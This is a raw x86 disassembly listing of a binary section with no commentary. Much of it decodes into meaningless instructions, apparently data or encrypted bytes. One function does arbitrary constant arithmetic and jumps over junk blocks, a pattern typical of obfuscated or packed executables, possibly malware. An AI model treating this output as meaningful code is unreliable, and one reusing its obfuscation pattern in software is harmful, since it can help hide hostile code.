  40f0d2:	lea    cx,ds:0xaeb3fbe1
  40f0d9:	repnz xchg ebx,eax
  40f0db:	add    ch,dh
  40f0dd:	pop    ds
  40f0de:	dec    ecx
  40f0df:	mov    al,0x54
  40f0e1:	mov    esi,edi
  40f0e3:	xor    ecx,esp
  40f0e5:	fdivp  st(6),st
  40f0e7:	push   0x5b6b9d06
  40f0ec:	in     al,dx
  40f0ed:	inc    ch
  40f0ef:	in     eax,0xaf
  40f0f1:	xor    DWORD PTR [eax],esi
  40f0f3:	mov    gs,WORD PTR [edi+edx*8]
  40f0f6:	mov    al,ds:0x968639dd
  40f0fb:	ret    
  40f0fc:	pop    ebx
  40f0fd:	inc    esp
  40f0fe:	push   esi
  40f0ff:	into   
  40f100:	push   esp
  40f101:	jo     0x40f12a
  40f103:	loopne 0x40f168
  40f105:	xlat   BYTE PTR ds:[ebx]
  40f106:	adc    BYTE PTR [ebx+0x425b5c62],0xc9
  40f10d:	adc    bh,BYTE PTR ds:[edi-0xb]
  40f111:	(bad)  
  40f113:	rol    BYTE PTR [ebp+0x3],0xb4
  40f117:	mov    ebp,0x27512c41
  40f11c:	pop    edx
  40f11d:	and    dh,al
  40f11f:	mov    edi,0xd83236cd
  40f124:	push   ebx
  40f125:	int3   
  40f126:	add    ebx,DWORD PTR [esi+0x36]
  40f129:	mov    ebp,0xe374059e
  40f12e:	or     ecx,DWORD PTR [ebp-0x4beeefc2]
  40f134:	std    
  40f135:	inc    esi
  40f136:	fisttp QWORD PTR [eax]
  40f138:	in     al,dx
  40f139:	mov    esi,0x4571758f
  40f13e:	inc    ebx
  40f13f:	sbb    edi,ecx
  40f141:	inc    edi
  40f142:	outs   dx,DWORD PTR ds:[esi]
  40f143:	ins    BYTE PTR es:[edi],dx
  40f144:	mov    al,BYTE PTR [eax-0x60]
  40f147:	dec    eax
  40f148:	pusha  
  40f149:	pushf  
  40f14a:	adc    eax,0x42529dee
  40f14f:	pop    ebp
  40f150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f151:	push   ecx
  40f152:	mov    ebp,0xf6a803a3
  40f157:	pop    edx
  40f158:	cmp    eax,0xb46c1aaa
  40f15d:	add    dl,al
  40f15f:	popa   
  40f160:	fsubr  QWORD PTR [ebx]
  40f162:	ret    0x59bb
  40f165:	dec    eax
  40f166:	push   ebp
  40f167:	into   
  40f168:	fisttp DWORD PTR [eax+esi*8]
  40f16b:	mov    ds:0x4b7180db,eax
  40f170:	push   edx
  40f171:	mov    eax,0x4b17a163
  40f176:	xchg   ebx,eax
  40f177:	mov    DWORD PTR [ebx-0x431a9e06],ebp
  40f17d:	pushf  
  40f17e:	aas    
  40f17f:	add    ecx,DWORD PTR [ebp-0x4d]
  40f182:	in     al,0x4c
  40f184:	or     al,cl
  40f186:	xchg   BYTE PTR [ebp-0x1e3f33bd],dl
  40f18c:	xchg   ebx,eax
  40f18d:	stos   BYTE PTR es:[edi],al
  40f18e:	xor    DWORD PTR [eax-0x54],ebx
  40f191:	push   es
  40f192:	cmp    ebx,DWORD PTR [ebp-0xa2d2e21]
  40f198:	inc    ebp
  40f199:	jle    0x40f1ed
  40f19b:	sub    ebp,DWORD PTR [ebx-0x237b84c4]
  40f1a1:	sbb    al,BYTE PTR [ebx-0x583a5e06]
  40f1a7:	test   BYTE PTR [edi+0x25],dl
  40f1aa:	mov    ch,0xf6
  40f1ac:	mov    bh,0xd2
  40f1ae:	lds    eax,FWORD PTR [edx-0x2a]
  40f1b1:	mov    bh,0xd9
  40f1b3:	into   
  40f1b4:	xor    eax,edx
  40f1b6:	sbb    al,0xa1
  40f1b8:	fwait
  40f1b9:	les    esi,FWORD PTR [eax+0x5]
  40f1bc:	cli    
  40f1bd:	ret    
  40f1be:	data16 and al,0xe6
  40f1c1:	jecxz  0x40f1a4
  40f1c3:	addr16 addr16 leave 
  40f1c6:	dec    eax
  40f1c7:	add    eax,DWORD PTR [ebx]
  40f1c9:	ss in  al,0xe0
  40f1cc:	mov    bl,0xcf
  40f1ce:	out    0xaf,al
  40f1d0:	out    0xd,eax
  40f1d2:	mov    al,ds:0xcaa8480b
  40f1d7:	loopne 0x40f1d9
  40f1d9:	push   ds
  40f1da:	sub    ah,BYTE PTR [edx+0x2d]
  40f1dd:	call   0x7cec:0x4ba00c37
  40f1e4:	xlat   BYTE PTR ds:[ebx]
  40f1e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1e6:	in     eax,dx
  40f1e7:	pop    es
  40f1e8:	cmp    ebx,DWORD PTR [ecx]
  40f1ea:	out    0xeb,al
  40f1ec:	fwait
  40f1ed:	sub    DWORD PTR [edx],0xffffffcb
  40f1f0:	sbb    DWORD PTR [ebx+ebp*8+0x1a69700e],eax
  40f1f7:	popa   
  40f1f8:	arpl   si,bp
  40f1fa:	inc    edi
  40f1fb:	jecxz  0x40f27a
  40f1fd:	das    
  40f1fe:	lahf   
  40f1ff:	cdq    
  40f200:	sti    
  40f201:	jmp    0x5561:0x14b1dd35
  40f208:	sahf   
  40f209:	jno    0x40f26f
  40f20b:	and    al,0x1b
  40f20d:	imul   edx,DWORD PTR [ebx],0x770954dc
  40f213:	fcom   QWORD PTR ds:0x94fe1467
  40f219:	enter  0xd89b,0xd0
  40f21d:	dec    ecx
  40f21e:	push   ebp
  40f21f:	lods   al,BYTE PTR ds:[esi]
  40f220:	pop    ebp
  40f221:	cld    
  40f222:	scas   al,BYTE PTR es:[edi]
  40f223:	out    dx,al
  40f224:	ffreep st(1)
  40f226:	iret   
  40f227:	push   ss
  40f228:	push   eax
  40f229:	xchg   edx,eax
  40f22a:	mov    edi,0xd128aec0
  40f22f:	jb     0x40f207
  40f231:	and    dl,BYTE PTR [edx-0x69]
  40f234:	add    eax,0x66c33d5b
  40f239:	fwait
  40f23a:	inc    esi
  40f23b:	sub    bh,dl
  40f23d:	push   esp
  40f23e:	mov    ecx,0x24abcbaf
  40f243:	mov    bl,0x19
  40f245:	test   eax,0xf3dc5bdd
  40f24a:	(bad)  
  40f24b:	mov    bh,0xfb
  40f24d:	xor    edi,ebp
  40f24f:	push   ecx
  40f250:	(bad)  
  40f251:	hlt    
  40f252:	or     al,0x9d
  40f254:	xchg   BYTE PTR [ecx-0x13],dl
  40f257:	sub    dl,BYTE PTR [eax+0x56]
  40f25a:	push   es
  40f25b:	ret    
  40f25c:	mov    ds:0xdbf0e76,eax
  40f261:	add    al,0xd9
  40f263:	mov    cl,BYTE PTR [ebx-0x2e98de4a]
  40f269:	push   ss
  40f26a:	mov    al,ds:0x34cad312
  40f26f:	xor    esp,DWORD PTR [ebx+0x3eceef3]
  40f275:	test   eax,0x20ffcd08
  40f27a:	js     0x40f2b8
  40f27c:	pop    es
  40f27d:	mov    ah,0xc5
  40f27f:	pop    ds
  40f280:	jmp    0xa1d6792d
  40f285:	(bad)  
  40f287:	jp     0x40f244
  40f289:	xchg   BYTE PTR [ebx+eiz*2-0x1b61891c],cl
  40f290:	mov    ebx,DWORD PTR [ebx]
  40f292:	test   DWORD PTR [ecx+0x68],ebp
  40f295:	ja     0x40f247
  40f297:	pop    es
  40f298:	imul   eax,edi,0xfffffffb
  40f29b:	or     edx,ebp
  40f29d:	test   eax,0x8cd0d579
  40f2a2:	mov    edx,0x7deb0023
  40f2a7:	enter  0xafd8,0xa
  40f2ab:	cwde   
  40f2ac:	and    ah,cl
  40f2ae:	pusha  
  40f2af:	out    0xd2,al
  40f2b1:	push   0xffffffd2
  40f2b3:	stos   DWORD PTR es:[edi],eax
  40f2b4:	jb     0x40f299
  40f2b6:	pop    ebp
  40f2b7:	aad    0x91
  40f2b9:	inc    ebp
  40f2ba:	mov    dl,BYTE PTR [esi-0x362ec343]
  40f2c0:	add    esp,DWORD PTR [ebx+edx*4-0x13]
  40f2c4:	enter  0xd217,0x81
  40f2c8:	and    edi,eax
  40f2ca:	cmc    
  40f2cb:	cld    
  40f2cc:	push   ecx
  40f2cd:	(bad)  [ecx]
  40f2cf:	mov    ds:0x7e571ceb,eax
  40f2d4:	push   es
  40f2d5:	jbe    0x40f2b8
  40f2d7:	inc    ebx
  40f2d8:	mov    dl,0x51
  40f2da:	push   eax
  40f2db:	sbb    DWORD PTR [edx-0x5dd58416],ebx
  40f2e1:	dec    ecx
  40f2e2:	add    dh,bh
  40f2e4:	or     al,0xfd
  40f2e6:	mov    ch,0x91
  40f2e8:	call   0xb514b13e
  40f2ed:	and    esp,eax
  40f2ef:	into   
  40f2f0:	das    
  40f2f1:	imul   edx,DWORD PTR [ebx+0x73],0x1f
  40f2f5:	adc    al,0xa2
  40f2f7:	popa   
  40f2f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2f9:	iret   
  40f2fa:	sub    BYTE PTR [eax+0x9],dl
  40f2fd:	mul    BYTE PTR [esp+ebx*8-0x5d]
  40f301:	push   ebp
  40f302:	test   ebp,edi
  40f304:	jb     0x40f332
  40f306:	jnp    0x40f324
  40f308:	push   esp
  40f309:	xchg   esi,eax
  40f30a:	mov    cl,0x20
  40f30c:	stc    
  40f30d:	retf   
  40f30e:	leave  
  40f30f:	and    eax,0x3fb177ca
  40f314:	jb     0x40f33e
  40f316:	ret    0x8b87
  40f319:	sub    DWORD PTR ds:0x2519bef1,0x59
  40f320:	sbb    dl,BYTE PTR [edx+0x4]
  40f323:	stos   DWORD PTR es:[edi],eax
  40f324:	or     al,0x9a
  40f326:	mov    al,ds:0x24a4f4d
  40f32b:	cmp    DWORD PTR [eax],esi
  40f32d:	inc    edx
  40f32e:	ret    0x7bc0
  40f331:	retf   0x433b
  40f334:	ror    DWORD PTR [ebp-0x15],0xd9
  40f338:	loop   0x40f311
  40f33a:	push   0xafcf5551
  40f33f:	xor    BYTE PTR [edi],bl
  40f341:	aad    0x5d
  40f343:	imul   ecx,edi,0x65
  40f346:	lock loope 0x40f324
  40f349:	into   
  40f34a:	mov    ah,0x63
  40f34c:	pop    eax
  40f34d:	loope  0x40f2fa
  40f34f:	fstp   QWORD PTR [esi+0x5b]
  40f352:	leave  
  40f353:	ret    0xc
  40f356:	push   ebp
  40f357:	mov    ebp,esp
  40f359:	sub    esp,0xec
  40f35f:	push   ebx
  40f360:	push   esi
  40f361:	mov    DWORD PTR [ebp-0x8],0x548e
  40f368:	mov    DWORD PTR [ebp-0x4],0x61c2
  40f36f:	mov    eax,DWORD PTR [ebp-0x4]
  40f372:	jmp    0x40f640
  40f377:	outs   dx,BYTE PTR ds:[esi]
  40f378:	rol    BYTE PTR [eax],cl
  40f37a:	jnp    0x40f399
  40f37c:	cmp    ch,BYTE PTR [edx-0x5e]
  40f37f:	ret    0x499f
  40f382:	push   0x4b
  40f384:	lods   al,BYTE PTR ds:[esi]
  40f385:	or     al,0x7e
  40f387:	sub    ebp,DWORD PTR [eax+0x14be1818]
  40f38d:	sbb    BYTE PTR [eax],bl
  40f38f:	mov    bh,0x8b
  40f391:	loope  0x40f38c
  40f393:	jl     0x357860f2
  40f399:	imul   ebx,DWORD PTR [ebp-0x32],0xffffffc7
  40f39d:	push   ss
  40f39e:	mov    dl,0xc
  40f3a0:	aas    
  40f3a1:	sub    ebp,edi
  40f3a3:	jb     0x40f377
  40f3a5:	mov    edx,DWORD PTR ds:0xc4cfaae0
  40f3ab:	and    dh,BYTE PTR [edi-0x69]
  40f3ae:	out    dx,al
  40f3af:	pop    es
  40f3b0:	mov    dl,0x21
  40f3b2:	and    BYTE PTR [esi-0x49],dh
  40f3b5:	out    dx,eax
  40f3b6:	lahf   
  40f3b7:	inc    edi
  40f3b8:	(bad)  
  40f3ba:	dec    ecx
  40f3bb:	inc    edx
  40f3bc:	mov    edx,0x2ab3e793
  40f3c1:	or     DWORD PTR [ebp+0x6a74c6e1],edi
  40f3c7:	dec    ebp
  40f3c8:	sti    
  40f3c9:	pop    eax
  40f3ca:	cmp    BYTE PTR [esi*2-0x7d73b76],dl
  40f3d1:	mov    eax,0x7eaf8e83
  40f3d6:	scas   al,BYTE PTR es:[edi]
  40f3d7:	cmpxchg BYTE PTR [edx],bh
  40f3da:	jle    0x40f3e8
  40f3dc:	xlat   BYTE PTR ds:[ebx]
  40f3dd:	ja     0x40f433
  40f3df:	sub    BYTE PTR [edi-0x3ac2d238],ah
  40f3e5:	adc    BYTE PTR [eax-0x65],ch
  40f3e8:	clc    
  40f3e9:	xor    al,0x9c
  40f3eb:	xchg   edx,eax
  40f3ec:	gs dec ebx
  40f3ee:	xchg   edx,eax
  40f3ef:	(bad)  
  40f3f0:	std    
  40f3f1:	leave  
  40f3f2:	or     dh,dl
  40f3f4:	sti    
  40f3f5:	ss jl  0x40f419
  40f3f8:	test   cl,al
  40f3fa:	sub    BYTE PTR [ebx+esi*8],dl
  40f3fd:	into   
  40f3fe:	or     DWORD PTR [ebp-0x42cf8459],esi
  40f404:	dec    ebx
  40f405:	jae    0x40f43a
  40f407:	dec    esi
  40f408:	mov    eax,ds:0x2e4eedf8
  40f40d:	jg     0x40f39d
  40f40f:	mov    ?,WORD PTR [edi-0x72be01fd]
  40f415:	mov    ah,0x12
  40f417:	jns    0x40f45b
  40f419:	inc    edx
  40f41a:	fstp   TBYTE PTR [edx-0x45]
  40f41d:	adc    ah,BYTE PTR ds:[eax]
  40f420:	retf   
  40f421:	or     al,0x7f
  40f423:	cmp    eax,ecx
  40f425:	and    dl,BYTE PTR [eax-0x63]
  40f428:	or     edx,DWORD PTR [edx-0x7f3fb1af]
  40f42e:	loop   0x40f4a6
  40f430:	sahf   
  40f431:	pop    es
  40f432:	push   0xffffffb4
  40f434:	cmp    al,BYTE PTR [ebp+0x4a]
  40f437:	jmp    0x40f46b
  40f439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f43a:	ds jmp 0x40f42d
  40f43d:	xchg   ecx,eax
  40f43e:	fild   WORD PTR [edi+edi*4]
  40f441:	mov    ch,0x76
  40f443:	add    eax,0x81e2443c
  40f448:	jg     0x40f403
  40f44a:	out    dx,eax
  40f44b:	retf   0x7503
  40f44e:	lea    edi,[ecx-0x68]
  40f451:	test   BYTE PTR [ecx],bh
  40f453:	clc    
  40f454:	mov    bh,0x3
  40f456:	addr16 jns 0x40f421
  40f459:	lods   al,BYTE PTR ds:[esi]
  40f45a:	ss jb  0x40f445
  40f45d:	ins    DWORD PTR es:[edi],dx
  40f45e:	test   eax,0xe056f2ba
  40f463:	add    al,BYTE PTR [ebx+0x65425453]
  40f469:	fwait
  40f46a:	inc    ebx
  40f46b:	fdiv   QWORD PTR [esi+ecx*1-0x3d060f7c]
  40f472:	mov    al,0x39
  40f474:	push   esp
  40f475:	fwait
  40f476:	jecxz  0x40f444
  40f478:	cwde   
  40f479:	aam    0x53
  40f47b:	jecxz  0x40f498
  40f47d:	inc    edi
  40f47e:	mov    ah,0x9f
  40f480:	stc    
  40f481:	outs   dx,DWORD PTR ds:[esi]
  40f482:	push   es
  40f483:	ins    BYTE PTR es:[edi],dx
  40f484:	or     al,0x25
  40f486:	mov    al,ds:0xaec5f27c
  40f48b:	pusha  
  40f48c:	add    cl,BYTE PTR [edx-0x60]
  40f48f:	arpl   WORD PTR [ebp-0x42],cx
  40f492:	sti    
  40f493:	pop    ss
  40f494:	add    DWORD PTR [ebx-0x33],ebp
  40f497:	sub    DWORD PTR [esi-0x5edc4b67],esp
  40f49d:	(bad)  
  40f49e:	mov    cs,WORD PTR [ebx+0x1ba47c8c]
  40f4a4:	mov    ds:0xe60c0296,eax
  40f4a9:	adc    edi,DWORD PTR [esi+0x66]
  40f4ac:	sub    al,0x1c
  40f4ae:	int3   
  40f4af:	jb     0x40f4b8
  40f4b1:	ja     0x40f4d7
  40f4b3:	pop    es
  40f4b4:	sti    
  40f4b5:	inc    ecx
  40f4b6:	and    al,0x1f
  40f4b8:	sub    DWORD PTR [eax-0x63],esi
  40f4bb:	pop    edx
  40f4bc:	adc    esi,DWORD PTR gs:[esi-0xb]
  40f4c0:	push   edi
  40f4c1:	les    esi,FWORD PTR [eax]
  40f4c3:	and    DWORD PTR [ebx],ebx
  40f4c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4c6:	mov    dl,0x2e
  40f4c8:	retf   0xc1e6
  40f4cb:	mov    esi,0xf59d194b
  40f4d0:	push   ebp
  40f4d1:	fistp  QWORD PTR [ecx+0x2c]
  40f4d4:	jmp    0x40f491
  40f4d6:	fidivr WORD PTR [edi+0x2f]
  40f4d9:	jmp    0x40f4cc
  40f4db:	push   esi
  40f4dc:	lds    eax,FWORD PTR ds:0xa2364dbf
  40f4e2:	cmp    BYTE PTR [ecx+eiz*8+0x2fd80705],ch
  40f4e9:	jl     0x40f4d9
  40f4eb:	addr16 out dx,eax
  40f4ed:	pop    esi
  40f4ee:	pop    eax
  40f4ef:	push   eax
  40f4f0:	loop   0x40f4f8
  40f4f2:	or     ch,bl
  40f4f4:	inc    ebp
  40f4f5:	fild   QWORD PTR [edx]
  40f4f7:	xchg   edx,eax
  40f4f8:	fsub   QWORD PTR [eax+0x22]
  40f4fb:	mov    ch,0x62
  40f4fd:	push   cs
  40f4fe:	test   eax,0x525c9340
  40f503:	ss leave 
  40f505:	adc    DWORD PTR [ebx],ecx
  40f507:	repz mov dh,0x1e
  40f50a:	mov    ds,WORD PTR [ecx+0x4f]
  40f50d:	shr    BYTE PTR [ecx+0x75],cl
  40f510:	test   DWORD PTR [ecx-0x5],0xaded10b4
  40f517:	(bad)  
  40f518:	in     al,dx
  40f519:	fst    QWORD PTR [esi]
  40f51b:	call   0x8f55d84a
  40f520:	mov    eax,ds:0x9e2905fd
  40f525:	cmp    eax,0xa77c4aab
  40f52a:	sub    eax,DWORD PTR [eax-0x35183328]
  40f530:	cwde   
  40f531:	imul   edi,DWORD PTR [ecx],0x67
  40f534:	lods   eax,DWORD PTR ds:[esi]
  40f535:	mov    WORD PTR [edx],gs
  40f537:	xchg   BYTE PTR [eax-0x72304d63],al
  40f53d:	stc    
  40f53e:	(bad)  
  40f53f:	lods   al,BYTE PTR ds:[esi]
  40f540:	jl     0x40f4ec
  40f542:	sbb    BYTE PTR [ecx],0xa4
  40f545:	mov    ah,0xec
  40f547:	inc    esi
  40f548:	pop    esp
  40f549:	repz push esp
  40f54b:	(bad)  [eax+0x60]
  40f54e:	fbld   TBYTE PTR [ebx+0x13]
  40f551:	popa   
  40f552:	mov    bh,0x7f
  40f554:	clc    
  40f555:	test   BYTE PTR [ebp-0x51],bh
  40f558:	lahf   
  40f559:	jp     0x40f4f4
  40f55b:	ja     0x40f512
  40f55d:	out    dx,al
  40f55e:	jno    0x40f5c2
  40f560:	(bad)  
  40f561:	jg     0x40f5ab
  40f563:	rcl    DWORD PTR [ecx+0x32c3219],1
  40f569:	sbb    cl,BYTE PTR [esi+ecx*1]
  40f56c:	enter  0xfc14,0x52
  40f570:	aas    
  40f571:	jmp    0x94a366a7
  40f576:	call   0x9b8a96b0
  40f57b:	mov    al,0xf7
  40f57d:	xchg   DWORD PTR [edx],esp
  40f57f:	ss add eax,0x21787534
  40f585:	aam    0x34
  40f587:	xchg   DWORD PTR ds:0x57445808,ebp
  40f58d:	sub    dh,BYTE PTR [eax-0x2]
  40f590:	inc    edi
  40f591:	ss mov bl,0x66
  40f594:	inc    BYTE PTR [esi]
  40f596:	jnp    0x40f543
  40f598:	cli    
  40f599:	gs pop ds
  40f59b:	pop    edx
  40f59c:	out    0x7e,al
  40f59e:	aaa    
  40f59f:	leave  
  40f5a0:	rcl    DWORD PTR [ebx+0x42],0x5
  40f5a4:	bound  esi,QWORD PTR [ebp-0x57]
  40f5a7:	das    
  40f5a8:	adc    al,0x11
  40f5aa:	into   
  40f5ab:	mov    al,BYTE PTR [edx]
  40f5ad:	sub    eax,0x80c84ead
  40f5b2:	and    BYTE PTR [ebx+0x48],bl
  40f5b5:	dec    esi
  40f5b6:	aaa    
  40f5b7:	cs (bad) 
  40f5ba:	add    al,0x52
  40f5bc:	imul   edx,DWORD PTR [ebx-0x16],0x799e3621
  40f5c3:	ja     0x40f585
  40f5c5:	jge    0x40f5dc
  40f5c7:	xlat   BYTE PTR ds:[ebx]
  40f5c8:	xchg   esp,eax
  40f5c9:	jo     0x40f57a
  40f5cb:	adc    eax,0x7d8d2f7c
  40f5d0:	fyl2xp1 
  40f5d2:	outs   dx,BYTE PTR ds:[esi]
  40f5d3:	mov    al,ds:0xf0769548
  40f5d8:	out    0xd5,eax
  40f5da:	add    ecx,edi
  40f5dc:	xchg   ecx,eax
  40f5dd:	jne    0x40f591
  40f5df:	push   ds
  40f5e0:	pop    edi
  40f5e1:	aas    
  40f5e2:	jae    0x40f5a1
  40f5e4:	jl     0x40f5fc
  40f5e6:	dec    ecx
  40f5e7:	popf   
  40f5e8:	in     al,0xeb
  40f5ea:	in     eax,dx
  40f5eb:	sbb    eax,0x5ea4ea22
  40f5f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5f1:	cdq    
  40f5f2:	add    eax,DWORD PTR [ebp+eiz*8+0x20]
  40f5f6:	or     DWORD PTR [eax],edi
  40f5f8:	xchg   BYTE PTR [edx-0x3a],bl
  40f5fb:	xchg   edi,eax
  40f5fc:	xor    edi,esi
  40f5fe:	mov    BYTE PTR [esi+0x69],bh
  40f601:	outs   dx,DWORD PTR ds:[esi]
  40f602:	add    BYTE PTR [esi+eiz*1+0x7ec273da],al
  40f609:	pushf  
  40f60a:	sbb    DWORD PTR [edi],0x4a734725
  40f610:	cmp    edi,DWORD PTR [esi-0x71]
  40f613:	pop    ecx
  40f614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f615:	mov    dh,dh
  40f617:	cs call 0x8dccf112
  40f61d:	retf   
  40f61e:	lods   al,BYTE PTR ds:[esi]
  40f61f:	inc    ecx
  40f620:	cmc    
  40f621:	jo     0x40f60e
  40f623:	aad    0x6c
  40f625:	mov    dl,ah
  40f627:	mov    ah,0x6f
  40f629:	jmp    0x3b20bc00
  40f62e:	lods   al,BYTE PTR ds:[esi]
  40f62f:	inc    eax
  40f630:	mov    edi,0xbf708bca
  40f635:	(bad)  [ebx]
  40f637:	pop    edi
  40f638:	jns    0x40f5f2
  40f63a:	scas   eax,DWORD PTR es:[edi]
  40f63b:	lea    ebx,[esi-0x6b]
  40f63e:	inc    edi
  40f63f:	iret   
  40f640:	mov    ecx,DWORD PTR [ebp-0x8]
  40f643:	add    eax,0x1ca5
  40f648:	or     eax,ecx
  40f64a:	mov    ecx,DWORD PTR ds:0x422598
  40f650:	lea    eax,[eax+ecx*1-0x7eef]
  40f657:	mov    DWORD PTR [ebp-0x5c],eax
  40f65a:	mov    DWORD PTR [ebp-0x4],0x8ea
  40f661:	mov    DWORD PTR [ebp-0x8],0x5759
  40f668:	mov    eax,DWORD PTR [ebp-0x8]
  40f66b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f66e:	and    eax,0x27f6
  40f673:	xor    eax,ecx
  40f675:	mov    ecx,DWORD PTR ds:0x4226cc
  40f67b:	imul   eax,eax,0x18
  40f67e:	xor    eax,0x17970
  40f683:	lea    eax,[ebp+eax*1-0x54]
  40f687:	mov    DWORD PTR [eax],ecx
  40f689:	mov    DWORD PTR [ebp-0x4],0x7584
  40f690:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40f697:	mov    eax,DWORD PTR [ebp-0x8]
  40f69a:	xor    edx,edx
  40f69c:	push   0x3
  40f69e:	pop    ecx
  40f69f:	div    ecx
  40f6a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6a4:	xor    edx,edx
  40f6a6:	push   0x2
  40f6a8:	add    eax,0x14d3
  40f6ad:	and    eax,ecx
  40f6af:	mov    ecx,0x6404
  40f6b4:	sub    ecx,eax
  40f6b6:	mov    DWORD PTR [ebp-0x74],ecx
  40f6b9:	mov    DWORD PTR [ebp-0xc],0x13b5
  40f6c0:	mov    DWORD PTR [ebp-0x8],0x2e54
  40f6c7:	mov    DWORD PTR [ebp-0x4],0x2f11
  40f6ce:	mov    eax,DWORD PTR [ebp-0x8]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6d4:	lea    eax,[ecx+eax*1-0x65ec]
  40f6db:	mov    ecx,0x5e208
  40f6e0:	div    ecx
  40f6e2:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e5:	lea    eax,[eax+ecx*1+0x40c7]
  40f6ec:	mov    DWORD PTR [ebp-0x24],eax
  40f6ef:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40f6f6:	mov    DWORD PTR [ebp-0x8],0x16ac
  40f6fd:	mov    DWORD PTR [ebp-0xc],0x2185
  40f704:	mov    eax,DWORD PTR [ebp-0xc]
  40f707:	mov    ecx,DWORD PTR [ebp-0x8]
  40f70a:	xor    eax,0x1f75
  40f70f:	sub    eax,ecx
  40f711:	mov    ecx,DWORD PTR [ebp-0x4]
  40f714:	jmp    0x40f9e2
  40f719:	mov    ch,0xd2
  40f71b:	pop    edx
  40f71c:	mov    BYTE PTR [edx+0x20],bl
  40f71f:	stos   DWORD PTR es:[edi],eax
  40f720:	and    dl,BYTE PTR [edx+0x34]
  40f723:	sbb    BYTE PTR [edx-0x4396ed9f],ch
  40f729:	shl    DWORD PTR [edx+0x14be1818],1
  40f72f:	sbb    BYTE PTR [eax],bl
  40f731:	pusha  
  40f732:	repz dec ebp
  40f734:	fistp  QWORD PTR [eax-0x56]
  40f737:	fbstp  TBYTE PTR [esp+esi*1]
  40f73a:	cmp    ecx,DWORD PTR [edx+0x41673244]
  40f740:	mov    edi,0x6f72efe8
  40f745:	mov    ch,0x68
  40f747:	mov    ebx,0xab2a9596
  40f74c:	mov    ds:0x79f5a4e2,al
  40f751:	push   edx
  40f752:	push   edi
  40f753:	nop
  40f754:	int3   
  40f755:	mov    edi,fs
  40f757:	inc    eax
  40f758:	(bad)  
  40f75a:	push   eax
  40f75b:	adc    al,0xb7
  40f75d:	cmp    dl,BYTE PTR [edx+eax*1]
  40f760:	mov    ch,0x2d
  40f762:	lock inc edx
  40f764:	je     0x40f795
  40f766:	sbb    eax,0x9d9928b
  40f76b:	jge    0x40f717
  40f76d:	repnz loopne 0x40f752
  40f770:	xchg   esi,eax
  40f771:	aas    
  40f772:	cld    
  40f773:	jl     0x40f75a
  40f775:	dec    ecx
  40f776:	sbb    al,0x62
  40f778:	jo     0x40f797
  40f77a:	(bad)  
  40f77b:	(bad)  
  40f77c:	jae    0x40f77d
  40f77e:	daa    
  40f77f:	aam    0x6d
  40f781:	push   cs
  40f782:	xor    ch,BYTE PTR [eax+0x41]
  40f785:	mov    ch,0x33
  40f787:	cmp    ah,BYTE PTR [ebx+0x72]
  40f78a:	int3   
  40f78b:	sub    ebx,edx
  40f78d:	and    edx,DWORD PTR [edi-0x1c010949]
  40f793:	jmp    0x40f774
  40f795:	retf   
  40f796:	ins    DWORD PTR es:[edi],dx
  40f797:	mov    eax,0x8914da08
  40f79c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f79d:	sbb    al,0xcf
  40f79f:	icebp  
  40f7a0:	push   ebx
  40f7a1:	push   esi
  40f7a2:	enter  0xc07f,0x91
  40f7a6:	jns    0x40f7d0
  40f7a8:	dec    edx
  40f7a9:	inc    eax
  40f7aa:	pop    ds
  40f7ab:	pop    ecx
  40f7ac:	popa   
  40f7ad:	int3   
  40f7ae:	mov    edx,0xa19257ea
  40f7b3:	ret    0x24c7
  40f7b6:	loop   0x40f75c
  40f7b8:	shl    DWORD PTR [esi-0x7a],cl
  40f7bb:	jp     0x40f759
  40f7bd:	imul   edi,esi,0x4f2ad2d2
  40f7c3:	addr16 jno 0x40f7d8
  40f7c6:	mov    edi,ebp
  40f7c8:	jl     0x40f77b
  40f7ca:	inc    eax
  40f7cb:	cmp    al,dh
  40f7cd:	cmp    bl,ah
  40f7cf:	inc    ebx
  40f7d0:	mov    dh,0xce
  40f7d2:	pop    edi
  40f7d3:	mov    ds:0xb9749e5f,eax
  40f7d8:	sar    dl,1
  40f7da:	arpl   WORD PTR [ebp+0x62b5a4a1],si
  40f7e0:	dec    edx
  40f7e1:	xchg   edi,eax
  40f7e2:	push   ebp
  40f7e3:	xor    esp,DWORD PTR [ebp+ecx*2+0x1d1cc7f8]
  40f7ea:	sub    ebp,ecx
  40f7ec:	inc    ebx
  40f7ed:	xchg   esi,eax
  40f7ee:	in     eax,0x95
  40f7f0:	sub    BYTE PTR [esi],ch
  40f7f2:	repnz (bad) 
  40f7f4:	cmp    BYTE PTR [ecx+0x1f],al
  40f7f7:	inc    ecx
  40f7f8:	and    al,0x11
  40f7fa:	lods   al,BYTE PTR ds:[esi]
  40f7fb:	xchg   esi,eax
  40f7fc:	js     0x40f858
  40f7fe:	mov    WORD PTR ds:0x329f049e,gs
  40f804:	(bad)  
  40f805:	jp     0x40f7cd
  40f807:	push   ecx
  40f809:	loop   0x40f7dc
  40f80b:	js     0x40f7c0
  40f80d:	add    BYTE PTR [ecx+eax*2-0x40],dh
  40f811:	stc    
  40f812:	push   es
  40f813:	addr16 ret 0xd810
  40f817:	leave  
  40f818:	mov    eax,ds:0x9fa37e28
  40f81d:	enter  0x3b7c,0xf0
  40f821:	stos   DWORD PTR es:[edi],eax
  40f822:	dec    esi
  40f823:	ins    DWORD PTR es:[edi],dx
  40f824:	inc    ebx
  40f825:	jp     0x40f7c9
  40f827:	jg     0x40f872
  40f829:	stc    
  40f82a:	adc    eax,0x4d01ba7b
  40f82f:	mov    eax,ds:0x7bdf536b
  40f834:	mov    fs,WORD PTR [esi]
  40f836:	push   ebp
  40f837:	pop    esi
  40f838:	sub    DWORD PTR [esi+eiz*1-0x6bdc576],edi
  40f83f:	mov    ss,ebx
  40f841:	loope  0x40f82a
  40f843:	push   esp
